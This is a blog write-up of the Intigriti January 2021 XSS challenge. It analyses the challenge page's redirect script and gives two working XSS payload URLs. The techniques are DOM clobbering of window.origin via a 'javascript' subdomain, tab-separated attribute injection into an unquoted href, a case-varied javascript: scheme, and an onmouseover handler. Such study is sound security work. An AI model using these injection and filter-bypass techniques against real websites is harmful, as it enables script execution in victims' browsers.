---
layout: post
title:  "Write-up: Intigriti January 2021 XSS Challenge"
date:   2021-01-31 23:00:00 +0000
categories: security
---

The following is my write-up for the [first Intigriti XSS challenge](https://twitter.com/intigriti/status/1353711594719555585) of 2021.

![header](/assets/2021-02-01-intigriti-0121/header.png)

I discovered two solutions, the intended one and an unintended one, both of which were accepted by the challenge creators. These are documented below.

## Let's Get Started...

The challenge takes place on a single static HTML page. Viewing the HTML reveals two stand out elements: 

1. A "popover" div containing a message about the number of Intigriti's Twitter followers.

![popover html](/assets/2021-02-01-intigriti-0121/popover.png)

2. A script file, located at `/script.js`.

![script.js](/assets/2021-02-01-intigriti-0121/script.png)

Here's my analysis of the script, section by section. I've assigned numbers to each part of the script to make it easy to reference later.

### Part 0x01

```js
  window.href = new URL(window.location.href);
  window.r = href.searchParams.get("r");
```

This reads the `r` query string parameter from the current URL into the `window.r` variable.

### Part 0x02

```js
  //Remove malicious values from href, redirect, referrer, name, ...
  ["document", "window"].forEach(function(interface){
    Object.keys(window[interface]).forEach(function(globalVariable){
        if((typeof window[interface][globalVariable] == "string") && (window[interface][globalVariable].indexOf("javascript") > -1)){
            delete window[interface][globalVariable];
        }
    });
  });
```

This code looks at all variables of type `string` within both `document` and `window` scope, and removes anything containing the word `javascript` (specifically in lower case). It appears the author's intent was to remove "malicious" links i.e. `javascript:alert('h4x0r3d')`.

### Part 0x03

```js
  window.onload = function(){
    var links = document.getElementsByTagName("a");
    for(var i = 0; i < links.length; i++){
      links[i].onclick = function(e){
        e.preventDefault();
        safeRedirect(e.target.href);
      }
    }
  }
  
```

When the page loads, an onclick event is assigned to each anchor tag on the page, overriding the default behaviour with something new. Instead of links being handled in the regular way when clicked, the `safeRedirect` function is called on the `href` of the anchor tag instead.

### Part 0x04

```js
  if(r != undefined){
    safeRedirect(r);
  }
```

If the `r` value is defined, call the `safeRedirect` function on this value. Presumably then, the `r` parameter can be used to redirect to a given URL.

### Part 0x05

```js
  function safeRedirect(url){
    if(!url.match(/[<>"' ]/)){
      window.setTimeout(function(){
          if(url.startsWith("https://")){
            window.location = url;
          }
          else{ //local redirect
            window.location = window.origin + "/" + url;
          }
          window.setTimeout(function(){
            document.getElementById("error").style.display = "block";
          }, 1000);
      }, 5000);
      document.getElementById("popover").innerHTML = `
        <p>You're being redirected to ${url} in 5 seconds...</p>
        <p id="error" style="display:none">
          If you're not being redirected, click <a href=${url}>here</a>
        </p>.`;
    }
    else{
      alert("Invalid URL.");
    }
  }
```

The `safeRedirect` function takes a URL. If the URL contains any of `<`,`>`,`"`,`'`,` ` (space), an alert box is shown with message "Invalid URL", and no redirect occurs.

If these characters aren't included in the input, the function changes the content of the "popover" div to some templated HTML. This contains a message telling the user about the URL they are being directed to, which includes the unescaped URL that was passed to the function. It also includes a link to the URL to click on in case the redirection fails - but this link is hidden by default.

After 5 seconds go by, the action continues. If the provided url begins with `https://`, a redirection to that URL occurs, by setting `window.location` directly. Otherwise, `window.location` is set to `window.origin`, followed by a slash, and the input URL - this is intended to handle relative URLs.

If another second passes before the redirection occurs, the link to the URL is displayed instead.

Right, that's how it all works, let's break it!

## Solution #1: Intended Solution

The first solution ends with the abuse of the following line:

```js
window.location = window.origin + "/" + url;
```

If we can set `window.origin` to an arbitrary value, we could cause a JavaScript payload to run here.

Well, we can! When a variable defined on `window` is referenced, the browser does two things. First it checks if a variable is defined with the given name, and uses the value of that variable if it is. If there is no such variable, it looks for a DOM element with an ID matching the variable name, and uses that element as the value instead.

The trouble here is that `origin` is a [special value which is preset by the browser](https://developer.mozilla.org/en-US/docs/Web/API/Location/origin), so it'll always be set.

We need to first unset this special value, and then create an element with an ID of origin to set our own arbitrary values.

Remember [part 0x02](#part-0x02) of the script? If a value contains the word `javascript`, the variable gets deleted.

Intigriti left a clue to help with this on the program page:

![clue](/assets/2021-02-01-intigriti-0121/scope.png)

The scope mentions `*.challenge-0121.intigriti.io` - meaning subdomains may be included!

A quick test shows the site is using wilcard subdomains:

![clue](/assets/2021-02-01-intigriti-0121/subdomains.png)

Therefore, if we use `javascript.challenge-0121.intigriti.io` as the domain, the `origin` variable will be removed from `window`. A quick test shows it works:

![clue](/assets/2021-02-01-intigriti-0121/no-origin.png)

Now to create an element with an ID of `origin` in order to set our own value.

Looking back at [part 0x05](#part-0x05) of the code shows:

```js
document.getElementById("popover").innerHTML = `
        <p>You're being redirected to ${url} in 5 seconds...</p>
        <p id="error" style="display:none">
          If you're not being redirected, click <a href=${url}>here</a>
        </p>.`;
```

We saw that `<>` characters are checked for, so it doesn't look like tags can be injected in the first `${url}` instance. The second instance occurs inside a tag attribute, and the attribute is unquoted! Spaces are checked for too, so we need to separate attributes with other characters such as tabs (`%09`) if we want to inject attributes.

Injecting a payload of `hello\tid=origin` would result in:

```html
<p>You're being redirected to hello    id=origin in 5 seconds...</p>
<p id="error" style="display:none">
  If you're not being redirected, click <a href=hello   id=origin>here</a>
</p>.
```

When the `<a>` element gets converted to a string, the `href` attribute will be used.

To get an XSS, we could redirect to something like `javascript:alert(1337)`, but variables are removed which contain `javascript`. There's an easy workaround for that: chuck some uppercase characters in there. `jAvAscript` should do it.

The full URL that is generated is done using:

```js
window.location = window.origin + "/" + url;
```

Which means if we used `jAvAscript:alert(0)%09id=origin`, the redirect URL would be `jAvAscript:alert(0)/jAvAscript:alert(0)id=origin`, which isn't valid javascript. If we add an extra `/` (`%2f`) in there it'll cause the remainder of the code after the alert to be commented out, as the two slashes will be placed together as `//`. 

Let's try our first payload:

```
https://javascript.challenge-0121.intigriti.io/?r=jAvAscript:alert(0)%2f%09id=origin
```

It works! The original challenge rules stipulate that we need to alert the string `{THIS_IS_THE_FLAG}`, but we can't use either types of quotes to delimit the string because of the filter at the top of [part 0x05](#part-0x05).

To work around this limitation, we can use [String.fromCharCode](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode). This function takes a series of ASCII codes and returns a string representation of them.

Building this into our payload gives:

```
https://javascript.challenge-0121.intigriti.io/?r=jAvAscript:alert(String.fromCharCode(123,84,72,73,83,95,73,83,95,84,72,69,95,70,76,65,71,125))%2f%09id=origin
```

...and...

![win](/assets/2021-02-01-intigriti-0121/win.png)

Challenge solved!

## Solution #2: Unintended Solution

There's a quick'n'dirty solution available too, albeit an unintended one. It requires interaction, but only minimally so, in fact just a mouse movement anywhere in the window. If the cursor is already within the window bounds, no interaction is even required!

In [part 0x05](#part-0x05) of the code you'll notice the message containing an anchor tag is shown a second after redirection occurs, in case the redirection fails for whatever reason.

We can cause this to happen by passing a URL which will always time out, I used a fairly randomly assembled `https://8.8.8.8:80`.

Hitting `https://challenge-0121.intigriti.io/?r=https://8.8.8.8:80` causes the following message to be displayed:

![slow](/assets/2021-02-01-intigriti-0121/slow.png)

As we established in the first solution, we can add arbitrary attributes to the `<a>` tag shown here. First we add CSS which makes the anchor tag fill the whole browser viewport:

```css
a {
    position: absolute;
    left: 0;
    top: 0;
    width: 10000px;
    height: 100000px;
}
```

The entire value of `r` needs to be parsable as a URL, adding a `?` after the `https://8.8.8.8:80` solves this issue.

Finally we add an `onmouseover` event...

```
https://challenge-0121.intigriti.io/?r=https://8.8.8.8:80?%09style%3dposition:absolute;left:0;top:0;width:10000px;height:100000px;%09onmouseover%3dalert(String.fromCharCode(123,84,72,73,83,95,73,83,95,84,72,69,95,70,76,65,71,125))
```

...and try it, which pops the alert box:

![win](/assets/2021-02-01-intigriti-0121/win.png)

## Summary

Thanks Intigriti for another fun challenge. The use of the subdomain to filter the origin value was pretty unique! 
